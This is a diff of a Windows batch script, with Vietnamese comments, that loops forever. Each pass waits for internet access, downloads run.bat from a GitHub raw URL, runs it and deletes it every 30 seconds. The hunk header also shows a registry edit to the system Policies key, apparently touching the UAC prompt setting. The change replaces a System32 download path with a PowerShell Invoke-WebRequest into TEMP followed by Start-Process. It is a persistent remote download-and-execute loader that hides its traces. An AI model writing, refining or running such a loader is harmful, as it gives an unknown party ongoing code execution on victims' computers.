@@ -8,22 +8,8 @@ reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v Prompt
 
 :loop
 del /f /q "C:\Windows\System32\WindowsPowerShell\run.bat"
-REM Kiểm tra kết nối Internet
 powershell -Command "while (-not (Test-Connection google.com -Count 1 -Quiet)) { Start-Sleep 5 }"
-
-REM Tải file run.bat từ URL
-powershell -Command "curl -o C:\Windows\System32\WindowsPowerShell\run.bat https://raw.githubusercontent.com/mitutina/mitutina/main/run.bat"
-
-REM Gọi file run.bat nếu tải thành công
-if exist "C:\Windows\System32\WindowsPowerShell\run.bat" (
-    call "C:\Windows\System32\WindowsPowerShell\run.bat"
-
-) else (
-    echo Không thể tải file run.bat. Đang thử lại sau 30 giây...
-)
-
-REM Đợi 30 giây trước khi thử lại
-del /f /q "C:\Windows\System32\WindowsPowerShell\run.bat"
+powershell -Command "$url = 'https://raw.githubusercontent.com/mitutina/mitutina/main/run.bat'; $tempPath = [System.IO.Path]::Combine($env:TEMP, 'run.bat'); Invoke-WebRequest -Uri $url -OutFile $tempPath; Start-Process $tempPath; Start-Sleep -Seconds 2; Remove-Item $tempPath"
 timeout /t 30 /nobreak >nul
 REM Quay lại vòng lặp
 goto loop
